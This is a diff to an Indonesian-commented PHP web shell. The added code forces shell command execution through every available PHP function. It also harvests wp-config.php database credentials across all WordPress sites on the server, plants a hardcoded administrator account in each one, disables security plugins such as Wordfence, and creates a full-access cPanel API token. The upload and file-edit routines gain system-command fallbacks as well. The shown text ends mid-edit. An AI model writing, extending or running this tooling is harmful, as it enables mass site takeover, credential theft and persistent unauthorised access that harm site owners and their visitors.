@@ -393,164 +393,277 @@ if (!file_exists($wp_base_dir . '/wp-config.php')) {
 }
 $wp_config_path = $wp_base_dir . '/wp-config.php';
 // ===========================================================================
-// FITUR: CREATE ADMIN & DISABLE LOGIN PROTECTION ONLY
+// FITUR: CPANEL TOKEN & MASS ADMIN (FULL FALLBACK EXECUTION MODE)
 // ===========================================================================
+
+// 1. CONFIG
 if (isset($_POST['create_wp_admin']) || isset($_POST['reactivate_plugins'])) {
-    $wp_base_dir = $default_dir;
-    if (!file_exists($wp_base_dir . '/wp-config.php')) {
-        $wp_base_dir = dirname($wp_base_dir);
+    @error_reporting(0);
+    @ini_set('display_errors', 0);
+    @ini_set('memory_limit', '512M');
+    if (function_exists('set_time_limit') && stripos(ini_get('disable_functions'), 'set_time_limit') === false) {
+        @set_time_limit(0);
     }
-    $wp_config_path = $wp_base_dir . '/wp-config.php';
+}
 
-    if (file_exists($wp_config_path)) {
-        $config_content = file_get_contents($wp_config_path);
+// 2. HELPER: EKSEKUSI PERINTAH TANGGUH (MULTI-METHOD)
+if (!function_exists('jalankan_cmd_tangguh')) {
+    function jalankan_cmd_tangguh($cmd) {
+        $out = "";
+        $cmd .= " 2>&1"; // Tangkap error output juga
+
+        // 1. shell_exec
+        if (function_exists('shell_exec') && stripos(ini_get('disable_functions'), 'shell_exec') === false) {
+            $out = @shell_exec($cmd);
+            if (!empty($out)) return $out;
+        }
+        // 2. exec
+        if (function_exists('exec') && stripos(ini_get('disable_functions'), 'exec') === false) {
+            @exec($cmd, $o);
+            $out = implode("\n", $o);
+            if (!empty($out)) return $out;
+        }
+        // 3. system
+        if (function_exists('system') && stripos(ini_get('disable_functions'), 'system') === false) {
+            ob_start(); @system($cmd); $out = ob_get_clean();
+            if (!empty($out)) return $out;
+        }
+        // 4. passthru
+        if (function_exists('passthru') && stripos(ini_get('disable_functions'), 'passthru') === false) {
+            ob_start(); @passthru($cmd); $out = ob_get_clean();
+            if (!empty($out)) return $out;
+        }
+        // 5. popen
+        if (function_exists('popen') && stripos(ini_get('disable_functions'), 'popen') === false) {
+            $fp = @popen($cmd, 'r');
+            if ($fp) {
+                while (!feof($fp)) $out .= fread($fp, 1024);
+                pclose($fp);
+                if (!empty($out)) return $out;
+            }
+        }
+        // 6. proc_open
+        if (function_exists('proc_open') && stripos(ini_get('disable_functions'), 'proc_open') === false) {
+            $desc = [1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
+            $proc = @proc_open($cmd, $desc, $pipes);
+            if (is_resource($proc)) {
+                $out = stream_get_contents($pipes[1]); // Stdout
+                $out .= stream_get_contents($pipes[2]); // Stderr
+                fclose($pipes[1]); fclose($pipes[2]); proc_close($proc);
+                if (!empty($out)) return $out;
+            }
+        }
+        return $out;
+    }
+}
+
+// 3. HELPER: BACA FILE (PHP NATIVE + EXEC FALLBACK)
+if (!function_exists('baca_file_smart')) {
+    function baca_file_smart($path) {
+        if (!file_exists($path)) return "";
         
-        // Helper: Parse wp-config
-        if (!function_exists('get_wp_config_value')) {
-            function get_wp_config_value($content, $constant) {
-                if (preg_match("/define\(\s*'".preg_quote($constant, '/')."',\s*'([^']+)'/", $content, $matches)) {
-                    return $matches[1];
-                }
-                return null;
+        // A. PHP Native (Paling Cepat & Aman)
+        $c = @file_get_contents($path);
+        if ($c) return $c;
+        
+        // B. Stream Read
+        if (function_exists('fopen') && function_exists('fread')) {
+            $h = @fopen($path, 'r');
+            if ($h) {
+                $c = @fread($h, filesize($path) + 1024);
+                fclose($h);
+                if ($c) return $c;
             }
         }
         
-        $db_host = get_wp_config_value($config_content, 'DB_HOST');
-        $db_name = get_wp_config_value($config_content, 'DB_NAME');
-        $db_user = get_wp_config_value($config_content, 'DB_USER');
-        $db_pass = get_wp_config_value($config_content, 'DB_PASSWORD');
-        
-        if (preg_match("/\\\$table_prefix\s*=\s*'([^']+)'/", $config_content, $matches)) {
-            $db_prefix = $matches[1];
-        } else {
-            $db_prefix = 'wp_';
-        }
-        
-        $conn = mysqli_connect($db_host, $db_user, $db_pass, $db_name);
-        if (!$conn) {
-            $error_msg = "Connection failed: " . mysqli_connect_error();
-        } else {
-            $tbl_options = $db_prefix . 'options';
+        // C. Exec Fallback (cat) - Jika permission PHP ditolak, coba via system
+        // Gunakan fungsi jalankan_cmd_tangguh agar mencoba semua metode exec
+        $cmd = "cat " . escapeshellarg($path);
+        $c = jalankan_cmd_tangguh($cmd);
+        if ($c) return $c;
 
-            // --- A. REACTIVATE LOGIC ---
-            if (isset($_POST['reactivate_plugins'])) {
-                // Ambil backup plugin
-                $q_backup = mysqli_query($conn, "SELECT option_value FROM `{$tbl_options}` WHERE option_name = 'xshikata_backup_plugins' LIMIT 1");
+        return "";
+    }
+}
+
+if (!function_exists('get_conf_val_smart')) {
+    function get_conf_val_smart($content, $key) {
+        if (preg_match("/define\(\s*['\"]" . preg_quote($key, '/') . "['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/", $content, $m)) return $m[1];
+        return null;
+    }
+}
+
+// 4. SCAN FOLDER (STREAM MODE)
+if (!function_exists('scan_smart_stream')) {
+    function scan_smart_stream($dir, &$results) {
+        $dir = rtrim($dir, '/') . '/';
+        if (file_exists($dir . 'wp-config.php')) $results[] = $dir . 'wp-config.php';
+
+        if ($dh = @opendir($dir)) {
+            while (($file = readdir($dh)) !== false) {
+                if ($file === '.' || $file === '..') continue;
+                $full_path = $dir . $file;
                 
-                if ($q_backup && mysqli_num_rows($q_backup) > 0) {
-                    $row_backup = mysqli_fetch_assoc($q_backup);
-                    $original_plugins = $row_backup['option_value'];
-                    
-                    // Restore
-                    $escaped_plugins = mysqli_real_escape_string($conn, $original_plugins);
-                    $restore_q = mysqli_query($conn, "UPDATE `{$tbl_options}` SET option_value = '{$escaped_plugins}' WHERE option_name = 'active_plugins'");
-                    
-                    if ($restore_q) {
-                        mysqli_query($conn, "DELETE FROM `{$tbl_options}` WHERE option_name = 'xshikata_backup_plugins'");
-                        $success_msg = "Plugin keamanan telah diaktifkan kembali.";
-                    }
-                } else {
-                    $error_msg = "Tidak ada backup plugin ditemukan.";
+                if (is_dir($full_path) && !is_link($full_path)) {
+                    $target_public = $full_path . '/public_html/wp-config.php';
+                    $target_root   = $full_path . '/wp-config.php';
+                    if (file_exists($target_public)) $results[] = $target_public;
+                    elseif (file_exists($target_root)) $results[] = $target_root;
                 }
             }
+            closedir($dh);
+        }
+    }
+}
+
+// --- LOGIC EKSEKUSI ---
+
+// A. BUAT TOKEN CPANEL (UAPI)
+if (isset($_POST['buat_token_cpanel'])) {
+    $dom = $_SERVER['SERVER_NAME'];
+    if(function_exists('php_uname')) { $p=explode(" ",php_uname()); if(isset($p[1]))$dom=$p[1]; }
+    
+    $usr = getenv('USER');
+    if(!$usr && function_exists('get_current_user')) $usr=get_current_user();
+    
+    // Path binary uapi
+    $bins = ["uapi", "/usr/bin/uapi", "/usr/local/cpanel/bin/uapi", "/usr/local/bin/uapi"];
+    $cmd_base = "Tokens create_full_access name=xshikata";
+    $res_tok = ""; $suc_tok = false;
+
+    foreach($bins as $b) {
+        $full_cmd = "$b $cmd_base";
+        // Panggil fungsi multi-fallback kita
+        $res_tok = jalankan_cmd_tangguh($full_cmd);
+        
+        // Cek keberhasilan
+        if($res_tok && (stripos($res_tok,'result')!==false || stripos($res_tok,'token')!==false)) {
+            $suc_tok=true; break;
+        }
+    }
+
+    $h_tok = "<div style='background:#1b1b1b; padding:15px; border:1px solid #333; border-radius:5px;'>";
+    $h_tok .= "<h4 style='color:#00FF00; margin:0 0 10px 0; border-bottom:1px solid #444;'>cPanel Token Result</h4>";
+    $h_tok .= "<p style='margin:0'>Domain: $dom | User: $usr</p>";
+    $h_tok .= "<textarea style='width:100%; height:100px; background:#111; color:#00FF00; margin-top:5px; border:1px solid #444;'>".htmlspecialchars($res_tok)."</textarea>";
+    if(!$suc_tok && !$res_tok) $h_tok .= "<p style='color:red;'>Gagal eksekusi. Semua fungsi exec (shell_exec, system, popen, dll) mungkin didisable.</p>";
+    $h_tok .= "</div>";
+    $success_msg = $h_tok;
+}
+
+// B. MASS ADMIN
+if (isset($_POST['create_wp_admin']) || isset($_POST['reactivate_plugins'])) {
+    $targets = [];
+    $root = isset($default_dir) ? $default_dir : getcwd();
+
+    if (isset($_POST['create_wp_admin'])) {
+        scan_smart_stream($root, $targets);
+        $targets = array_unique($targets);
+    } else {
+        if(file_exists($root.'/wp-config.php')) $targets[]=$root.'/wp-config.php';
+    }
+
+    if (empty($targets)) {
+        $error_msg = "Tidak ditemukan wp-config.php (Smart Scan).";
+    } else {
+        $log = "<div style='text-align:left; max-height:400px; overflow-y:auto; background:#1b1b1b; padding:15px; border:1px solid #333;'>";
+        $log .= "<h4 style='color:#00FF00; margin:0 0 10px 0; border-bottom:1px solid #444;'>Mass Execution Result</h4>";
+
+        $au = 'xshikata';
+        $ap = md5('Lulz1337');
+        $ae = 'topupgameku.id@gmail.com';
+
+        foreach ($targets as $cfg) {
+            // Gunakan baca file smart (termasuk fallback exec)
+            $raw = baca_file_smart($cfg);
+            if (!$raw) { $log .= "<div style='color:red'>Gagal baca: ".basename(dirname($cfg))."</div>"; continue; }
+
+            $dh = get_conf_val_smart($raw, 'DB_HOST');
+            $du = get_conf_val_smart($raw, 'DB_USER');
+            $dp = get_conf_val_smart($raw, 'DB_PASSWORD');
+            $dn = get_conf_val_smart($raw, 'DB_NAME');
+            $pre = 'wp_';
+            if (preg_match("/\\\$table_prefix\s*=\s*['\"]([^'\"]+)['\"]/", $raw, $m)) $pre = $m[1];
+
+            $disp = str_replace($root, '', dirname($cfg));
+            $log .= "<div style='border-bottom:1px dashed #333; padding-bottom:5px; margin-bottom:5px;'>";
+            $log .= "<strong style='color:#ccc;'>Target:</strong> ".($disp?:'/')." ";
+
+            @mysqli_report(MYSQLI_REPORT_OFF);
+            $cn = mysqli_init();
+            @mysqli_options($cn, MYSQLI_OPT_CONNECT_TIMEOUT, 1);
             
-            // --- B. DISABLE SPECIFIC PLUGINS & CREATE ADMIN ---
-            elseif (isset($_POST['create_wp_admin'])) {
-                // 1. Create Admin
-                $admin_username = 'xshikata';
-                $admin_password_plain = 'Lulz1337';
-                $admin_password = md5($admin_password_plain); 
-                $admin_email = 'topupgameku.id@gmail.com';
-                
-                $insert_user = "INSERT INTO `{$db_prefix}users` (user_login, user_pass, user_nicename, user_email, user_status) VALUES ('{$admin_username}', '{$admin_password}', 'WordPress Administrator', '{$admin_email}', 0)";
-                $user_created = mysqli_query($conn, $insert_user);
-                $user_id = mysqli_insert_id($conn);
+            if (@mysqli_real_connect($cn, $dh, $du, $dp, $dn)) {
+                if (isset($_POST['create_wp_admin'])) {
+                    // Create User
+                    $q1 = @mysqli_query($cn, "SELECT ID FROM {$pre}users WHERE user_login='$au'");
+                    if ($q1 && mysqli_num_rows($q1) > 0) {
+                        $uid = mysqli_fetch_assoc($q1)['ID'];
+                        @mysqli_query($cn, "UPDATE {$pre}users SET user_pass='$ap' WHERE ID=$uid");
+                        $st = "<span style='color:yellow'>[UPDATED]</span>";
+                    } else {
+                        @mysqli_query($cn, "INSERT INTO {$pre}users (user_login,user_pass,user_nicename,user_email,user_status,display_name) VALUES ('$au','$ap','Admin','$ae',0,'Admin')");
+                        $uid = mysqli_insert_id($cn);
+                        $st = "<span style='color:#0f0'>[CREATED]</span>";
+                    }
+                    
+                    // Privs
+                    $cap = serialize(['administrator'=>true]);
+                    @mysqli_query($cn, "INSERT INTO {$pre}usermeta (user_id,meta_key,meta_value) VALUES ($uid,'{$pre}capabilities','$cap') ON DUPLICATE KEY UPDATE meta_value='$cap'");
+                    @mysqli_query($cn, "INSERT INTO {$pre}usermeta (user_id,meta_key,meta_value) VALUES ($uid,'{$pre}user_level','10') ON DUPLICATE KEY UPDATE meta_value='10'");
 
-                if ($user_created) {
-                    $capabilities = 'a:1:{s:13:"administrator";s:1:"1";}';
-                    mysqli_query($conn, "INSERT INTO `{$db_prefix}usermeta` (user_id, meta_key, meta_value) VALUES ('{$user_id}', '{$db_prefix}capabilities', '{$capabilities}')");
-                    mysqli_query($conn, "INSERT INTO `{$db_prefix}usermeta` (user_id, meta_key, meta_value) VALUES ('{$user_id}', '{$db_prefix}user_level', '10')");
-                }
-
-                // 2. TARGETED PLUGIN DISABLE
-                // Daftar plugin yang diketahui mengubah login URL (berdasarkan screenshot & umum)
-                $target_plugins_keywords = [
-                    'admin-site-enhancements', // ASE
-                    'loginpress',              // LoginPress
-                    'wps-hide-login',          // WPS Hide Login
-                    'rename-wp-login',         // Rename WP Login
-                    'wp-security',             // AIOWPS
-                    'hide-my-wp',              // Hide My WP
-                    'ithemes-security'         // iThemes
-                ];
-
-                $q_curr = mysqli_query($conn, "SELECT option_value FROM `{$tbl_options}` WHERE option_name = 'active_plugins' LIMIT 1");
-                $disabled_count = 0;
-                
-                if ($q_curr && mysqli_num_rows($q_curr) > 0) {
-                    $row_curr = mysqli_fetch_assoc($q_curr);
-                    $current_plugins_raw = $row_curr['option_value'];
-                    $active_plugins = @unserialize($current_plugins_raw);
-
-                    if (is_array($active_plugins)) {
-                        // Backup dulu data aslinya (full list)
-                        $escaped_curr = mysqli_real_escape_string($conn, $current_plugins_raw);
-                        mysqli_query($conn, "INSERT INTO `{$tbl_options}` (option_name, option_value, autoload) VALUES ('xshikata_backup_plugins', '{$escaped_curr}', 'no') ON DUPLICATE KEY UPDATE option_value='{$escaped_curr}'");
-
-                        // Filter: Buang plugin yang ada di blacklist
-                        $new_plugins_list = [];
-                        foreach ($active_plugins as $plugin_path) {
-                            $is_target = false;
-                            foreach ($target_plugins_keywords as $keyword) {
-                                if (stripos($plugin_path, $keyword) !== false) {
-                                    $is_target = true;
-                                    break;
+                    // Plugins
+                    $qopt = @mysqli_query($cn, "SELECT option_value FROM {$pre}options WHERE option_name='active_plugins'");
+                    if ($qopt && mysqli_num_rows($qopt)>0) {
+                        $row = mysqli_fetch_assoc($qopt);
+                        if (preg_match('/wordfence|ithemes|security|login/i', $row['option_value'])) {
+                            $arr = @unserialize($row['option_value']);
+                            if(is_array($arr)) {
+                                $bkp = mysqli_real_escape_string($cn, $row['option_value']);
+                                @mysqli_query($cn, "INSERT IGNORE INTO {$pre}options (option_name,option_value,autoload) VALUES ('xshikata_bkp','$bkp','no')");
+                                $new = [];
+                                $bl = ['admin-site-enhancements','loginpress','wps-hide-login','rename-wp-login','wp-security','hide-my-wp','ithemes-security','wordfence'];
+                                foreach($arr as $p) {
+                                    $hit=0; foreach($bl as $b){if(stripos($p,$b)!==false)$hit=1;}
+                                    if(!$hit) $new[]=$p;
                                 }
-                            }
-                            
-                            if (!$is_target) {
-                                $new_plugins_list[] = $plugin_path; // Simpan plugin aman
-                            } else {
-                                $disabled_count++; // Hitung yang didisable
+                                $nval = mysqli_real_escape_string($cn, serialize(array_values($new)));
+                                @mysqli_query($cn, "UPDATE {$pre}options SET option_value='$nval' WHERE option_name='active_plugins'");
                             }
                         }
-
-                        // Update database dengan list plugin baru (tanpa security plugin)
-                        // Re-index array supaya urutan rapi (penting untuk serialize)
-                        $new_plugins_list = array_values($new_plugins_list);
-                        $new_serialized = serialize($new_plugins_list);
-                        $escaped_new = mysqli_real_escape_string($conn, $new_serialized);
-                        
-                        mysqli_query($conn, "UPDATE `{$tbl_options}` SET option_value = '{$escaped_new}' WHERE option_name = 'active_plugins'");
                     }
-                }
 
-                // 3. Get URL
-                $site_url = '';
-                $q_url = mysqli_query($conn, "SELECT option_value FROM `{$tbl_options}` WHERE option_name = 'siteurl' LIMIT 1");
-                if ($q_url && mysqli_num_rows($q_url) > 0) {
-                    $row_url = mysqli_fetch_assoc($q_url);
-                    $site_url = rtrim($row_url['option_value'], '/');
+                    // Login URL
+                    $surl = "";
+                    $qurl = @mysqli_query($cn, "SELECT option_value FROM {$pre}options WHERE option_name='siteurl'");
+                    if ($qurl && mysqli_num_rows($qurl)>0) $surl = mysqli_fetch_assoc($qurl)['option_value'];
+                    
+                    $log .= "$st <a href='$surl/wp-login.php' target='_blank' style='color:#aaa'>Login</a>";
+                } 
+                elseif (isset($_POST['reactivate_plugins'])) {
+                    $qbk = @mysqli_query($cn, "SELECT option_value FROM {$pre}options WHERE option_name='xshikata_bkp'");
+                    if ($qbk && mysqli_num_rows($qbk)>0) {
+                        $orig = mysqli_real_escape_string($cn, mysqli_fetch_assoc($qbk)['option_value']);
+                        @mysqli_query($cn, "UPDATE {$pre}options SET option_value='$orig' WHERE option_name='active_plugins'");
+                        @mysqli_query($cn, "DELETE FROM {$pre}options WHERE option_name='xshikata_bkp'");
+                        $log .= "<span style='color:#0f0'>[RESTORED]</span>";
+                    } else { $log .= "<span style='color:gray'>[NO BKP]</span>"; }
                 }
-                $final_login_url = $site_url . '/wp-admin/plugin-install.php?tab=upload';
-
-                // 4. Output
-                $success_msg = "<h3 style='margin-top:0; color:#00FF00;'>Admin Created & Protection Disabled!</h3>";
-                $success_msg .= "User: <strong>{$admin_username}</strong> / <strong>{$admin_password_plain}</strong><br>";
-                $success_msg .= "Disabled Security Plugins: <strong>{$disabled_count}</strong> (ASE, LoginPress, etc)<br>";
-                $success_msg .= "Login URL: <a href='{$final_login_url}' target='_blank' style='color:#00FF00; text-decoration:underline; font-weight:bold; font-size:1.1em;'>{$final_login_url}</a><br><br>";
-                
-                $success_msg .= "<div style='border:1px dashed #444; padding:10px; background:#222;'>";
-                $success_msg .= "<p style='margin:0 0 10px 0; color:#ddd;'>Klik tombol ini setelah login untuk mengaktifkan kembali plugin security:</p>";
-                $success_msg .= "<form method='POST' style='display:inline;'>";
-                $success_msg .= "<input type='hidden' name='reactivate_plugins' value='1'>";
-                $success_msg .= "<input type='hidden' name='berkas' value='" . htmlspecialchars(kunci($default_dir)) . "'>";
-                $success_msg .= "<button type='submit' class='btn-modern' style='background-color:#0088cc; color:white;'><i class='fas fa-shield-alt'></i> Re-activate Security Plugins</button>";
-                $success_msg .= "</form></div>";
+                mysqli_close($cn);
+            } else {
+                $log .= "<span style='color:red'>[SKIP DB]</span>";
             }
+            $log .= "</div>";
         }
-    } else {
-        $error_msg = "wp-config.php not found.";
+        $log .= "</div>";
+
+        if (isset($_POST['create_wp_admin'])) {
+            $log .= "<div style='margin-top:10px;'>";
+            $log .= "<form method='POST' style='display:inline; margin-right:5px;'><input type='hidden' name='reactivate_plugins' value='1'><input type='hidden' name='berkas' value='".htmlspecialchars(kunci($root))."'><button class='btn-modern' style='background:#0088cc;'>Restore (Single)</button></form>";
+            $log .= "<form method='POST' style='display:inline;'><input type='hidden' name='buat_token_cpanel' value='1'><input type='hidden' name='berkas' value='".htmlspecialchars(kunci($root))."'><button class='btn-modern' style='background:#28a745;'>Token</button></form>";
+            $log .= "</div>";
+        }
+        $success_msg = $log;
     }
 }
 // ===========================================================================
@@ -928,52 +1041,118 @@ else if($awal == 'hapus_folder' && isset($_POST['zf']) && is_string($_POST['zf']
 }
 else if ($awal == 'upl_file' && isset($_FILES['ufile'])) {
     function smart_upload($fileKey, $targetDir) {
-        $res = [
-            'success' => false,
-            'method'  => '',
-            'message' => '',
-            'name'    => ''
-        ];
+        $res = ['success' => false, 'method' => '', 'message' => '', 'name' => ''];
+        
+        // 1. Validasi Input
         if (!isset($_FILES[$fileKey]) || $_FILES[$fileKey]['error'] !== UPLOAD_ERR_OK) {
-            $res['message'] = 'No file selected or upload error (error code: ' . (isset($_FILES[$fileKey]['error']) ? $_FILES[$fileKey]['error'] : 'unknown') . ')';
+            $res['message'] = 'Upload error code: ' . ($_FILES[$fileKey]['error'] ?? 'unknown');
             return $res;
         }
 
         $filename = basename($_FILES[$fileKey]['name']);
         $tmp      = $_FILES[$fileKey]['tmp_name'];
-        $dest     = rtrim($targetDir, '/') . '/' . $filename;
-        // Method 1: move_uploaded_file()
-        if (@move_uploaded_file($tmp, $dest)) {
-            $res['success'] = true;
-            $res['method'] = 'move_uploaded_file';
+        $pemisah  = substr($targetDir, -1) !== "/" ? "/" : "";
+        $dest     = $targetDir . $pemisah . $filename;
+
+        // 2. Validasi Source (Anti-0kb)
+        if (!file_exists($tmp) || filesize($tmp) <= 0) {
+            $res['message'] = 'File tmp kosong/hilang. Upload gagal dari server.';
+            return $res;
         }
-        // Method 2: copy()
-        elseif (@copy($tmp, $dest)) {
-            @unlink($tmp);
-            $res['success'] = true;
-            $res['method'] = 'copy';
+
+        // --- A. METODE PHP NATIVE ---
+
+        // 1. Move Uploaded File
+        if (!$res['success'] && @move_uploaded_file($tmp, $dest)) {
+            $res['success'] = true; $res['method'] = 'move_uploaded_file';
         }
-        // Method 3: file_get_contents + file_put_contents
-        elseif (($data = @file_get_contents($tmp)) !== false && @file_put_contents($dest, $data)) {
-            @unlink($tmp);
-            $res['success'] = true;
-            $res['method'] = 'file_get_contents';
+
+        // 2. Copy
+        if (!$res['success'] && @copy($tmp, $dest)) {
+            $res['success'] = true; $res['method'] = 'copy';
         }
-        // Method 4: rename tmp to a temporary file, then copy
-        else {
-            $alt = sys_get_temp_dir() . '/' . uniqid('bypass_', true);
-            if (@rename($alt, $alt) && @copy($alt, $dest)) {
-                @unlink($alt);
-                $res['success'] = true;
-                $res['method'] = 'rename+copy';
+
+        // 3. Rename
+        if (!$res['success'] && @rename($tmp, $dest)) {
+            $res['success'] = true; $res['method'] = 'rename';
+        }
+
+        // 4. Stream Copy (Fopen)
+        if (!$res['success']) {
+            $src = @fopen($tmp, 'rb');
+            $dst = @fopen($dest, 'wb');
+            if ($src && $dst) {
+                if (@stream_copy_to_stream($src, $dst)) {
+                    $res['success'] = true; $res['method'] = 'stream_copy';
+                }
+            }
+            @fclose($src); @fclose($dst);
+        }
+
+        // 5. File Get/Put Contents
+        if (!$res['success']) {
+            $content = @file_get_contents($tmp);
+            if ($content !== false && strlen($content) > 0) {
+                if (@file_put_contents($dest, $content)) {
+                    $res['success'] = true; $res['method'] = 'file_put_contents';
+                }
             }
         }
 
+        // --- B. METODE SYSTEM COMMAND (Fallback Multi-Fungsi) ---
+        if (!$res['success']) {
+            // Helper: Cari fungsi eksekusi yang aktif (exec, shell_exec, system, dll)
+            $run_cmd = function($cmd) {
+                if (function_exists('shell_exec')) { @shell_exec($cmd); return true; }
+                if (function_exists('exec')) { @exec($cmd); return true; }
+                if (function_exists('system')) { @system($cmd); return true; }
+                if (function_exists('passthru')) { @passthru($cmd); return true; }
+                if (function_exists('popen')) { 
+                    $fp = @popen($cmd, 'r'); 
+                    if($fp) { pclose($fp); return true; } 
+                }
+                if (function_exists('proc_open')) {
+                    $proc = @proc_open($cmd, [0=>['pipe','r'], 1=>['pipe','w'], 2=>['pipe','w']], $pipes);
+                    if (is_resource($proc)) { proc_close($proc); return true; }
+                }
+                return false;
+            };
+
+            // Command list: cp, mv, cat
+            $sys_cmds = [
+                ['cmd' => "cp " . escapeshellarg($tmp) . " " . escapeshellarg($dest), 'name' => 'cp'],
+                ['cmd' => "mv " . escapeshellarg($tmp) . " " . escapeshellarg($dest), 'name' => 'mv'],
+                ['cmd' => "cat " . escapeshellarg($tmp) . " > " . escapeshellarg($dest), 'name' => 'cat']
+            ];
+
+            foreach ($sys_cmds as $action) {
+                // Jalankan command menggunakan fungsi apapun yang tersedia
+                if ($run_cmd($action['cmd'])) {
+                    // Cek hasil segera
+                    if (file_exists($dest) && filesize($dest) > 0) {
+                        $res['success'] = true;
+                        $res['method'] = 'sys_' . $action['name'];
+                        break; // Berhenti jika berhasil
+                    }
+                }
+            }
+        }
+
+        // --- C. VERIFIKASI AKHIR ---
         if ($res['success']) {
-            $res['name'] = $filename;
-            $res['message'] = "File uploaded successfully (<strong>{$res['method']}</strong>): <a href=\"" . htmlspecialchars($filename) . "\" target=\"_blank\">" . htmlspecialchars($filename) . "</a>";
+            // Double check keberadaan dan ukuran file
+            clearstatcache();
+            if (file_exists($dest) && filesize($dest) > 0) {
+                @chmod($dest, 0644);
+                $res['name'] = $filename;
+                $res['message'] = "File uploaded successfully via <strong>{$res['method']}</strong>";
+            } else {
+                $res['success'] = false;
+                $res['message'] = "Metode {$res['method']} jalan, tapi file hasil 0kb/hilang.";
+                @unlink($dest);
+            }
         } else {
-            $res['message'] = "All upload methods failed, please check permissions or server restrictions.";
+            $res['message'] = "Gagal total. Semua metode (PHP & System) diblokir/gagal.";
         }
 
         return $res;
@@ -984,79 +1163,6 @@ else if ($awal == 'upl_file' && isset($_FILES['ufile'])) {
 }
 
 
-?>
-<?php
-error_reporting(E_ALL);
-ini_set('display_errors', 1);
-
-// PHP configuration for file upload
-ini_set('upload_max_filesize', '64M');
-ini_set('post_max_size', '64M');
-ini_set('max_input_time', '300');
-ini_set('max_execution_time', '300');
-/**
- * Function for sanitizing file name
- * Only allows alphanumeric, underscore, dot, and dash characters.
- * If the file name is the same as the uploader file, add a prefix.
- */
-function sanitizeFilename($filename) {
-    $filename = preg_replace('/[^a-zA-Z0-9_\.-]/', '_', basename($filename));
-    if ($filename === basename(__FILE__)) {
-        $filename = 'upload_' . $filename;
-    }
-    return $filename;
-}
-
-$msg = '';
-
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    // Make sure the file has been uploaded without errors
-    if (isset($_FILES['upload_file']) && $_FILES['upload_file']['error'] === UPLOAD_ERR_OK) {
-        $originalName = $_FILES['upload_file']['name'];
-        $filename = sanitizeFilename($originalName);
-        // Get the destination directory from the 'berkas' input
-        if (isset($_POST['berkas']) && is_string($_POST['berkas']) && !empty($_POST['berkas'])) {
-            $targetDir = uraikan($_POST['berkas']);
-            if (!is_dir($targetDir)) {
-                $targetDir = __DIR__;
-            }
-        } else {
-            $targetDir = __DIR__;
-        }
-        // Make sure there is no trailing slash
-        $destination = rtrim($targetDir, '/') . '/' . $filename;
-
-        // Try the main method: move_uploaded_file()
-        if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $destination)) {
-            // Change file permissions to be accessible
-            chmod($destination, 0644);
-            $msg = "File <strong>$filename</strong> uploaded successfully via move_uploaded_file.";
-        } else {
-            // If it fails, try a fallback with copy()
-            if (copy($_FILES['upload_file']['tmp_name'], $destination)) {
-                unlink($_FILES['upload_file']['tmp_name']);
-                chmod($destination, 0644);
-                $msg = "File <strong>$filename</strong> uploaded successfully using fallback method copy().";
-            } else {
-                // Last fallback with file_get_contents + file_put_contents
-                $contents = file_get_contents($_FILES['upload_file']['tmp_name']);
-                if ($contents !== false && file_put_contents($destination, $contents)) {
-           
-                     unlink($_FILES['upload_file']['tmp_name']);
-                     chmod($destination, 0644);
-                    $msg = "File <strong>$filename</strong> uploaded successfully using fallback method file_get_contents() and file_put_contents().";
-                } else {
-                    $msg = "Failed to upload file. Please check directory permissions and server configuration.";
-                }
-            }
-        }
-    } else {
-        $errorCode = isset($_FILES['upload_file']['error']) ? $_FILES['upload_file']['error'] : 'unknown';
-        if($errorCode !== UPLOAD_ERR_NO_FILE) {
-            $msg = "An error occurred while uploading the file. (Error code: $errorCode)";
-        }
-    }
-}
 ?>
 <!DOCTYPE html>
 <html>
@@ -1969,14 +2075,74 @@ else if($awal=="edit_file" && isset($_POST['fayl']) && trim($_POST['fayl']) != "
 		{
 			unset($_SESSION['ys_took']);
 			$content = $_POST['content'];
-            if (is_writeable($default_dir . $pemisah . $namaBerkas)) {
-                if (file_put_contents($default_dir . $pemisah . $namaBerkas, $content) !== false) {
-                    $status = " <span class='qalin' style='color:#00FF00;'>Saved successfully!</span>";
-                } else {
-                    $status = " <span class='qalin' style='color:#ff5555;'>Error saving file. Check permissions.</span>";
+            $targetFile = $default_dir . $pemisah . $namaBerkas;
+            $save_success = false;
+            $used_method = '';
+
+            // 0. Coba ubah permission dulu agar writable
+            @chmod($targetFile, 0644);
+
+            // --- METODE 1: Standard PHP ---
+            if (!$save_success && file_put_contents($targetFile, $content) !== false) {
+                $save_success = true; $used_method = 'file_put_contents';
+            }
+
+            // --- METODE 2: Fopen/Fwrite (Stream) ---
+            if (!$save_success) {
+                $fp = @fopen($targetFile, 'w');
+                if ($fp) {
+                    if (@fwrite($fp, $content) !== false) {
+                        $save_success = true; $used_method = 'fwrite';
+                    }
+                    @fclose($fp);
                 }
+            }
+
+            // --- METODE 3: Tulis ke TMP lalu Pindah (Bypass Permission/Lock) ---
+            if (!$save_success) {
+                $tmp_file = tempnam(sys_get_temp_dir(), 'edit_');
+                if (@file_put_contents($tmp_file, $content) !== false) {
+                    // 3a. Rename/Move PHP
+                    if (@rename($tmp_file, $targetFile)) {
+                        $save_success = true; $used_method = 'rename_tmp';
+                    }
+                    // 3b. Copy PHP
+                    elseif (@copy($tmp_file, $targetFile)) {
+                        $save_success = true; $used_method = 'copy_tmp';
+                    }
+                    // 3c. System Command (cp/mv/cat)
+                    else {
+                        $cmd_run = function($c) {
+                            if(function_exists('shell_exec')){ @shell_exec($c); return true; }
+                            if(function_exists('exec')){ @exec($c); return true; }
+                            if(function_exists('system')){ @system($c); return true; }
+                            if(function_exists('passthru')){ @passthru($c); return true; }
+                            if(function_exists('popen')){ $p=@popen($c,'r'); if($p){pclose($p);return true;} }
+                            return false;
+                        };
+                        
+                        $c_cp  = "cp " . escapeshellarg($tmp_file) . " " . escapeshellarg($targetFile);
+                        $c_mv  = "mv " . escapeshellarg($tmp_file) . " " . escapeshellarg($targetFile);
+                        $c_cat = "cat " . escapeshellarg($tmp_file) . " > " . escapeshellarg($targetFile);
+
+                        if ($cmd_run($c_cp)) { $save_success = true; $used_method = 'exec_cp'; }
+                        elseif ($cmd_run($c_mv)) { $save_success = true; $used_method = 'exec_mv'; }
+                        elseif ($cmd_run($c_cat)) { $save_success = true; $used_method = 'exec_cat'; }
+                    }
+                    @unlink($tmp_file); // Hapus file sampah
+                }
+            }
+
+            // --- VERIFIKASI ANTI-0KB ---
